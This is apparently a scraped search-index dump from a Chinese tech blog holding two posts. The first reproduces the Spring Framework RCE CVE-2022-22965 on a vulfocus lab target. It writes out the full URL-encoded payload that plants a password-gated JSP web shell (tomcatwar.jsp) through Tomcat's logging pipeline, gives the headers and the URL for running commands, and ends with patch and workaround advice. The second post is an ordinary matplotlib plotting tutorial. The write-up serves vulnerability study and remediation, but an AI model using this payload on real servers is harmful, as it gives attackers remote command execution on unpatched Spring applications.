","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:2:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"影响版本 Spring Framework 5.3.X \u003c 5.3.18 Spring Framework 5.2.X \u003c 5.2.20 ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:3:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"利用条件 JDK 版本 \u003e= 9 目标JDK9及其以上版本 使⽤了Spring-beans包； 使⽤了Spring参数绑定； Spring参数绑定使⽤的是⾮基本参数类型，例如⼀般的POJO即可； ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:4:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"漏洞复现 复现环境：这里使用vulfocus在线靶场： ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:5:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"1.连接靶场： ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:5:1","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"2.发送POC POC: ?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di\u0026class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\u0026class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT\u0026class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar\u0026class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= 访问时抓包，在\"/“后插入EXP，并在请求头中插入如下字样： suffix: %\u003e c1: Runtime c2: \u003c% DNT: 1 Content-Length: 2 poc原理： 其中，header主要变更处为： “suffix”:\"%\u003e\", “c1”:“Runtime”, “c2”:\"\u003c%\", “DNT”:“1”, “Content-Type”:“application/x-www-form-urlencoded” :主体部分，链接后接两个参数pwd和cmd，pwd验证密码，cmd为实行的命令 class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp :上传的文件后缀 class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar ：上传的文件名 class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/ :webapps/ROOT/knan为上传的目录，此处为访问创建目录下的文件 数据包内容： ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:5:2","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"3.利用 若创建通过，放包后访问[url]/tomcatwar.jsp?pwd=j\u0026cmd=id即可看到id命令成功执行。 ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:5:3","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"利用工具 https://github.com/reznok/Spring4Shell-POC ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:6:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["渗透测试"],"content":"修复建议 一、官方修复建议： 当前 Spring Framework 官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下： https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement 二、临时修复建议： 该临时修复建议存在一定风险，建议用户可根据业务系统特性审慎选择采用临时修复方案： 需同时按以下两个步骤进行漏洞的临时修复: \\1. 在应用中全局搜索 @InitBinder 注解，看看方法体内是否调用 dataBinder.setDisallowedFields 方法，如果发现此代码片段的引入，则在原来的黑名单中，添加 {“class.”,“Class. ”,”. class.\", “.Class.\"}。(注：如果此代码片段使用较多，需要每个地方都追加) \\2. 在应用系统的项目包下新建以下全局类，并保证这个类被 Spring 加载到 (推荐在 Controller 所在的包中添加). 完成类添加后，需对项目进行重新编译打包和功能验证测试。并重新发布项目。 ","date":"2022-04-29","objectID":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/:7:0","tags":["cve-2022-22965","Spring Core漏洞","漏洞复现"],"title":"Spring core远程代码执行漏洞(CVE-2022-22965)复现","uri":"/spring-core%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-22965-%E5%A4%8D%E7%8E%B0/"},{"categories":["Python"],"content":"简介 Matplotlib 通常与 NumPy 和 SciPy（Scientific Python）一起使用， 这种组合广泛用于替代 MatLab，是一个强大的科学计算环境，有助于我们通过 Python 学习数据科学或者机器学习。 SciPy 是一个开源的 Python 算法库和数学工具包。 SciPy 包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。 matplotlib是Python最常用的绘图库，提供了一整套十分适合交互式绘图的命令，是非常强大的Python画图工具。 matplotlib可以画线图、散点图、等高线、图条形图、柱形图、3D图形、图形动画。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:1:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"绘图基础知识 使用matplotlib绘图的原理，主要就是理解figure(画布)、axes(坐标系)、axis(坐标轴)三者之间的关系。 matplotlib中，就是需要指定axes(坐标系)，每一个axes(坐标系)相当于一张画布上的一块区域。一张画布上，可以分配不同区域，也就是说，一张画布，可以指定多个axes(坐标系)。 特别注意：在matplotlib中，figure画布和axes坐标轴并不能显示的看见，我们能够看到的就是一个axis坐标轴的各种图形。 画板figure，画纸Sublpot画质，可多图绘画 画纸上最上方是标题title，用来给图形起名字 坐标轴Axis,横轴叫x坐标轴label，纵轴叫y坐标轴ylabel 图例Legend 代表图形里的内容 网格Grid，图形中的虚线，True显示网格 点 Markers：表示点的形状。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:2:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"创建figure(画布)的方式 1.隐式 想要使用matplotlib绘图，必须要先创建一个figure(画布)对象，然后还要有axes(坐标系)。 当第一次执行画图代码时，系统会判断是否已经有了figure对象，如果没有，系统会自动创建一个figure对象，并且在这个figure至上，自动创建一个axes坐标系(注意：默认只创建一个figure对象，一个axes坐标系)。也就是说，如果我们不设置figure对象，那么一个figure对象上，只能有一个axes坐标系，即我们只能绘制一个图形。 **优势：**如果只是绘制一个小图形，那么直接使用plt.xxx()的方式，会自动帮我们创建一个figure对象和一个axes坐标系，这个图形最终就是绘制在这个axes坐标系之上的。 劣势：如果我们想要在一个figure对象上，绘制多个图形，那么我们就必须拿到每个个axes对象，然后调用每个位置上的axes对象，就可以在每个对应位置的坐标系上，进行绘图，如下图所示。注意：如果figure对象是被默认创建的，那么我们根本拿不到axes对象。因此，需要我们显示创建figure对象。 2.显式 import matplotlib.pyplot as plt fig = plt.figure() axes1 = fig.add_subplot(2,1,1) axes2 = fig.add_subplot(2,1,2) plt.show() 实例： figure = plt.figure() # 先创建一个大图标 # 然后建立子图填充图标 # add_subplot中第一个参数是分割的行数，第二个参数是分割的列数，第三个参数是当前图所在的第几个位置，1代表第一个位置 axes1 = figure.add_subplot(2, 1, 1) axes2 = figure.add_subplot(2, 1, 2) axes1.plot([1, 3, 5, 7], [4, 9, 6, 8]) axes2.plot(np.random.randn(50).cumsum()) figure.show() subplot子图创建方法 方法1：先创建一个大图表 然后建立子图填充图表 fig=plt.figure(figsize=(10,6),facecolor='gray') ax1=fig.add_subplot(2,2,1) #在fig大图表里添加子图，第一行的左图 plt.plot(np.random.randn(50).cumsum(),'k--') #plot进行作图的时候只会跟最近的子图 plt.plot(np.random.randn(50).cumsum(),'b--') ax2=fig.add_subplot(2,2,2) #第一行的右图 ax2.hist(np.random.rand(50),alpha=0.5) ax4=fig.add_subplot(2,2,4) #第二行的右图 df2=pd.DataFrame(np.random.rand(10,4),columns=list('abcd')) ax4.plot(df2,alpha=0.5,linestyle='--',marker='.') # # 共享 x 轴 #plt.subplots(2, 2, sharex='col') # 共享 y 轴 #plt.subplots(2, 2, sharey='row') # 共享 x 轴和 y 轴 #plt.subplots(2, 2, sharex='all', sharey='all') # 这个也是共享 x 轴和 y 轴 #plt.subplots(2, 2, sharex=True, sharey=True) # 创建10 张图，已经存在的则删除 #fig, ax = plt.subplots(num=10, clear=True) 方法2：创建一个新的figure，并返回一个subplot对象的numpy数组 plt.subplot import matplotlib.pyplot as plt import numpy as np import pandas as pd # figure = plt.figure() fig,axes=plt.subplots(2, 3, figsize=(10,4)) #创建一个2行3列的大图表 ts=pd.Series(np.random.randn(1000).cumsum()) ax1=axes[0,1] #确定ax1的位置在0行1列的位置 ax1.plot(ts) #ax1进行画图 # figure.show() fig.show() 方法3：多系列图，分别绘制 import matplotlib.pyplot as plt import numpy as np import pandas as pd df=pd.DataFrame(np.random.randn(1000,4),columns=list('ABCD')).cumsum() df.plot(style='--.',alpha=0.4,grid=True,figsize=(8,8), subplots=True, layout=(2,3), sharex=True) plt.subplots_adjust(wspace=0,hspace=0.2) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:2:1","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Matplotlib Pyplot Pyplot 是 Matplotlib 的子库，提供了和 MATLAB 类似的绘图 API。 Pyplot 是常用的绘图模块，能很方便让用户绘制 2D 图表。 Pyplot 包含一系列绘图函数的相关函数，每个函数会对当前的图像进行一些修改，例如：给图像加上标记，生新的图像，在图像中产生新的绘图区域等等。 导入模块： # 导入matplotlib模块pyplot的模块，并简写成plt import matplotlib.pyplot as plt 可以调用pyplot模块的.plot方法绘制一些坐标，这个plot方法需要许多参数，但前两个是 “x” 和 “y” 坐标，放入列表。 plt.plot在后台[绘制]这个绘图，当绘制了我们想要的一切之后，需要把它带到屏幕上时，运用plt.show方法。 例子：通过两个坐标 (0,0) 到 (6,100) 来绘制一条线 import matplotlib.pyplot as plt import numpy as np xpoints = np.array([0, 6]) ypoints = np.array([0, 100]) plt.plot(xpoints, ypoints) plt.show() plot() 用于画图它可以绘制点和线，语法格式如下： # 画单条线 plot([x], y, [fmt], *, data=None, **kwargs) # 画多条线 plot([x], y, [fmt], [x2], y2, [fmt2], ..., **kwargs) \"\"\" 参数说明： x, y：点或线的节点，x 为 x 轴数据，y 为 y 轴数据，数据可以列表或数组。 fmt：可选，定义基本格式（如颜色、标记和线条样式）。 **kwargs：可选，用在二维平面图上，设置指定属性，如标签，线的宽度等。 \u003e\u003e\u003e plot(x, y) # 创建 y 中数据与 x 中对应值的二维线图，使用默认样式 \u003e\u003e\u003e plot(x, y, 'bo') # 创建 y 中数据与 x 中对应值的二维线图，使用蓝色实心圈绘制 \u003e\u003e\u003e plot(y) # x 的值为 0..N-1 \u003e\u003e\u003e plot(y, 'r+') # 使用红色 + 号 颜色字符：'b' 蓝色，'m' 洋红色，'g' 绿色，'y' 黄色，'r' 红色，'k' 黑色，'w' 白色，'c' 青绿色，'#008000' RGB 颜色符串。多条曲线不指定颜色时，会自动选择不同颜色。 线型参数：'‐' 实线，'‐‐' 破折线，'‐.' 点划线，':' 虚线。 标记字符：'.' 点标记，',' 像素标记(极小点)，'o' 实心圈标记，'v' 倒三角标记，'^' 上三角标记，'\u003e' 右三角标记，'\u003c' 左三角标记...等等。 \"\"\" 如果我们只想绘制两个坐标点，而不是一条线，可以使用 o 参数，表示一个实心圈的标记： import matplotlib.pyplot as plt import numpy as np xpoints = np.array([1, 8]) ypoints = np.array([3, 10]) plt.plot(xpoints, ypoints, 'o') plt.show() 我们也可以绘制任意数量的点，只需确保两个轴上的点数相同即可。如：绘制一条不规则线，坐标为 (1, 3) 、 (2, 8) 、(6, 1) 、(8, 10)，对应的两个数组为：[1, 2, 6, 8] 与 [3, 8, 1, 10]。 import matplotlib.pyplot as plt import numpy as np xpoints = np.array([1, 2, 6, 8]) ypoints = np.array([3, 8, 1, 10]) plt.plot(xpoints, ypoints) plt.show() # 如果我们不指定 x 轴上的点，则 x 会根据 y 的值来设置为 0, 1, 2, 3..N-1。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:3:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"完整的绘图步骤 1.导库 import matplotlib as mpl import matplotlib.pyplot as plt 2.创建figure画布对象 2.1如果绘制一个简单的小图形，我们可以不设置figure对象，使用默认创建的figure对象，当然我们也可以显示创建figure对象。 2.2如果一张figure画布上，需要绘制多个图形。那么就必须显示的创建figure对象，然后得到每个位置上的axes对象，进行对应位置上的图形绘制。 3.根据figure对象进行布局设置 4.获取对应位置子图的axes坐标系对象 figure = plt.figure() axes1 = figure.add_subplot(2,1,1) axes2 = figure.add_subplot(2,1,2) 5.调用axes对象，进行对应位置的图形绘制 这一步，是我们传入数据，进行绘图的一步。 对于图形的一些细节设置，都可以在这一步进行。 6.显示图形 plt.show()或figure.show()，如果在PyCharm中绘图的话，必须要加这句代码，才能显示。如果在notebook中进行绘图，可以不用加这句代码，而是自动显示。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:4:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"绘制常见图形 常用统计图对比： 1、折线图：以折线的上升或下降来表示统计数量的增减变化的统计图 特点：能够显示数据的变化趋势，反映事物的变化情况。（变化） 2、直方图：由一系列高度不等的纵向条纹或线段表示数据分布的情况。一般用横轴表示数据范围，纵轴表示分布情况。 特点：绘制连续性的数据，展示一组或者多组数据的分布情况。（统计） 3、条形图：排列在工作表的列或行中的数据可以绘制到条形图中 特点：绘制连离散的数据，能够一眼看出各个数据的大小，比较数据之间的差别。（统计） 4、散点图：用两组数据构成多个坐标点，考察坐标点的分布，判断两变量之间是否存在某种关联或总结坐标点的分布模式。 特点：判断变量之间是否存在数量关联趋势，展示离群点。（分布规律） ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:0","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"折线图 基本图形： from matplotlib import pyplot as plt x = range(2, 26, 2) y = [15, 13, 14.5, 17, 20, 25, 26, 26, 24, 22, 18, 15] # 绘图 plt.plot(x, y) # 展示图形 plt.show() 设置图片大小： # 设置宽和高，dpi plt.figure(figsize=(10, 5), dpi=80) #在图像模糊的时候可以传入dpi参数，让图片更加清晰 保存图片： #可以保存为svg这种矢量图格式，放大不会有锯齿 plt.savefig('./t1.png') 调整x或y轴上刻度： #调整X轴刻度 plt.xticks(x) #调整Y轴刻度 plt.yticks(y) 设置中文显示： # 设置中文字体显示 matplotlib.rc(\"font\", family='MicroSoft YaHei', weight='bold') plot方法使用： plt.plot( x, #x轴数据 y, #y轴数据 color='r', #线条颜色 linestyle='--', #线条样式 linewidth=5, #线条粗细 alpha=0.5 #透明度（0-1） ) 为每条线添加图例： #通过label指定图例内容 plt.plot(range(len(y)),y,label='test', linestyle='--',color='red',alpha=0.5) #通过loc指定图例位置，默认右上角 #'best', 'upper right', 'upper left', 'lower left', 'lower right', 'right', 'center left', 'center right', 'lower center', 'upper center', 'center' plt.legend(loc='best) 添加图形描述： # x轴标题 plt.xlabel(\"xxx\") # y轴标题 plt.ylabel(\"yyy\") # 图形标题 plt.title(\"My Picture\") 绘制网格 plt.grid(alpha=0.4) 趋势图： x = ['2000-01-03','2000-02-03','2000-03-03','2000-04-03'] # 定义y轴数据 y1 = [0,3,5,7] y2 = [11,22,33,44] plt.plot(x,y1,label='tempreature') plt.plot(x,y2,label='water') # 显示图例 plt.legend() plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:1","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"散点图 使用scatter绘制散点图 plt.scatter(x,y) # 与绘制条形图的唯一区别 # 用random模块获取两组数据，分别代表横纵坐标。一组数据里有50个数， # 用随机种子的方法固定住random模块获取得到的数据 # 并将散点图里的符号变为'*' import numpy as np np.random.seed(10) # 随机种子，将随机数固定住 heights = [] weights = [] heights.append(np.random.randint(150,185,size=50)) # weights.append(np.random.normal(loc=50,scale=100,size)) # 生成正太分布，也称高斯分布 weights.append(np.random.randint(50,100,size=50)) plt.scatter(heights,weights,marker='*',color='yellow') #默认是圆点，marker='*' 设置散点图标大小： import matplotlib.pyplot as plt import numpy as np x = np.array([1, 2, 3, 4, 5, 6, 7, 8]) y = np.array([1, 4, 9, 16, 7, 11, 23, 18]) sizes = np.array([20,50,100,200,500,1000,60,90]) plt.scatter(x, y, s=sizes) # plt.scatter(x, y, s=area, c=colors, alpha=0.5) # 设置颜色及透明度 plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:2","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"3D散点图 x = np.random.randint(0,10,size=100) y = np.random.randint(0,10,size=100) z = np.random.randint(0,10,size=100) # 创建二维对象 fig = plt.figure() # 强转 axes3d = Axes3D(fig) # 填充数据 axes3d.scatter(x,y,z) plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:3","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"条形图 使用bar绘制竖着的条形图 plt.bar(range(len(x)), y, width = 0.3, color = 'red') # bar绘制条形图，只能接受含数字的可迭代对象 width表示线条粗细 使用barh绘制横着的条形图 plt.bar(range(len(a)), b, height = 0.3, color = 'red') 如： from matplotlib import pyplot as plt import matplotlib # 绘制电影票房前20条形图 matplotlib.rc(\"font\", family=\"MicroSoft YaHei\", size=\"8\") a = [\"战狼2\", \"速度与激情8\", \"功夫瑜伽\", \"西游伏妖篇\", \"变形金刚5\\n:最后的骑士\", \"摔跤吧\\n！爸爸\", \"加勒比海盗5\\n:死无对证\", \"金刚：\\n骷髅岛\", \"极限特工\\n:终极回归\", \"生化危机6\\n：终章\", \"乘风破浪\", \"神偷奶爸3\", \"智取威虎山\", \"大闹天竺\", \"金刚狼3：\\n殊死一战\", \"蜘蛛侠：\\n英雄归来\", \"悟空传\", \"银河护卫队2\", \"情圣\", \"新木乃伊\", ] b = [56.01, 26.94, 17.53, 16.49, 15.45, 12.96, 11.8, 11.61, 11.28, 11.12, 10.49, 10.3, 8.75, 7.55, 7.32, 6.99, 6.88, 6.86, 6.58, 6.23] # 设置图形大小 plt.figure(figsize=(10, 7), dpi=80) # 绘制条形图,设置线条粗细 plt.bar(range(len(a)), b, width=0.3) # 设置字符串到x轴 plt.xticks(range(len(a)), a, rotation=90) # 绘制图例信息 plt.xlabel(\"电影名称\") plt.ylabel(\"电影票房（单位：亿）\") plt.title(\"电影票房前20\") # 绘制网格 plt.grid(alpha=0.3) plt.show() price = [11,22,33,44] plt.barh(range(4),price,align='center',color='red',alpha=0.5) plt.xlabel('价格') plt.yticks(range(4),['红楼梦','西游记','水浒传','三国演义']) plt.title('四大名著') plt.show() bar import matplotlib import matplotlib.pyplot as plt import numpy as np import pandas as pd # 指定默认字体 # matplotlib.rcParams['font.sans-serif'] = ['SimHei'] # 第一个参数：索引 # 第二个参数：高度 参数必须对应否则报错 plt.bar(range(5), [100,200,300,400,500], color='red') plt.xticks(range(5), ['A','B','C','D','E']) plt.xlabel('name') plt.ylabel('score') plt.title('student score')# 或显示图标Plt.show() plt.show() 自定义各个柱形的颜色： import matplotlib.pyplot as plt import numpy as np x = np.array([\"Runoob-1\", \"Runoob-2\", \"Runoob-3\", \"C-RUNOOB\"]) y = np.array([12, 22, 6, 18]) plt.bar(x, y, color = [\"#4CAF50\",\"red\",\"hotpink\",\"#556B2F\"]) plt.show() 设置柱形图宽度，bar() 方法使用 width 设置，barh() 方法使用 height 设置 height ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:4","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"直方图 使用hist绘制直方图 plt.hist(a, b) # 绘制频数直方图，a表示数据列表，b表示组数 plt.hist(a, b, density = True) # 绘制频率直方图 如： from matplotlib import pyplot as plt # 数据准备 a = [131, 98, 125, 131, 124, 139, 131, 117, 128, 108, 135, 138, 131, 102, 107, 114, 119, 128, 121, 142, 127, 130, 124, 101, 110, 116, 117, 110, 128, 128, 115, 99, 136, 126, 134, 95, 138, 117, 111, 78, 132, 124, 113, 150, 110, 117, 86, 95, 144, 105, 126, 130, 126, 130, 126, 116, 123, 106, 112, 138, 123, 86, 101, 99, 136, 123, 117, 119, 105, 137, 123, 128, 125, 104, 109, 134, 125, 127, 105, 120, 107, 129, 116, 108, 132, 103, 136, 118, 102, 120, 114, 105, 115, 132, 145, 119, 121, 112, 139, 125, 138, 109, 132, 134, 156, 106, 117, 127, 144, 139, 139, 119, 140, 83, 110, 102, 123, 107, 143, 115, 136, 118, 139, 123, 112, 118, 125, 109, 119, 133, 112, 114, 122, 109, 106, 123, 116, 131, 127, 115, 118, 112, 135, 115, 146, 137, 116, 103, 144, 83, 123, 111, 110, 111, 100, 154, 136, 100, 118, 119, 133, 134, 106, 129, 126, 110, 111, 109, 141, 120, 117, 106, 149, 122, 122, 110, 118, 127, 121, 114, 125, 126, 114, 140, 103, 130, 141, 117, 106, 114, 121, 114, 133, 137, 92, 121, 112, 146, 97, 137, 105, 98, 117, 112, 81, 97, 139, 113, 134, 106, 144, 110, 137, 137, 111, 104, 117, 100, 111, 101, 110, 105, 129, 137, 112, 120, 113, 133, 112, 83, 94, 146, 133, 101, 131, 116, 111, 84, 137, 115, 122, 106, 144, 109, 123, 116, 111, 111, 133, 150] # 计算组数 d = 3 # 组距 num_bins = (max(a) - min(a)) // d # 组数，取整 # 设置图形大小 plt.figure(figsize=(12, 5), dpi=80) # plt.hist(a, num_bins) # 频数 plt.hist(a, num_bins, density=True) # 频率 # 设置x轴的刻度 plt.xticks(range(min(a), max(a) + d, d)) plt.grid() plt.show() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:5","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"饼图 labels = ['A','B','C','D'] # autopct='%1.1f%%'显示比列，格式化显示一位小数，固定写法 plt.pie([50,39,50,20],labels=labels,autopct='%1.1f%%') plt.title('人口比例') ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:6","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"3D饼图突出展示 def test_pie(): beijing = [10,20,30,40] label = ['2-3年','3-4年','4-5年','5年'] color = ['red','yellow','green','blue'] indict = [] for index,item in enumerate(beijing): # 判断优先级 if item == max(beijing): indict.append(0.3) elif index == 1: indict.append(0.2) else: indict.append(0) plt.pie(beijing,labels=label,colors=color,startangle=90,shadow=True,explode=tuple(indict),autopct='%1.1f%%') plt.title('3D切割凸显饼图') plt.show() test_pie() ","date":"2022-04-29","objectID":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/:5:7","tags":["Matplotlib","数据分析","绘图"],"title":"Python之matplotlib学习","uri":"/python%E4%B9%8Bmatplotlib%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"面积图 from matplotlib import pyplot as plt import numpy as np # 导入3D模块 from mpl_toolkits.mplot3d.axes3d import Axes3D import matplotlib #指定默认字体 matplotlib.rcParams['font.sans-serif'] = ['SimHei'] # 面积图 def test_area(): date = ['2000-01-01','2000-02-01','2000-03-01','2000-04-01'] earn = [156,356,156,30] eat = [10,20,30,40] drink = [20,20,30,40] play = [20,20,30,40] # [20,20,30,40]] plt.stackplot(date,earn,eat,drink,play,colors=['red','yellow','green','blue']) plt.title('收入支出面积图展示') plt.plot([],[],color='red',label='收入') plt.plot([],[],color='yellow',label='吃') plt.plot([],[],color='green',label='喝') plt.plot([],[],color='blue',label='玩') # 展示图例 plt.legend() plt.show() test_area() 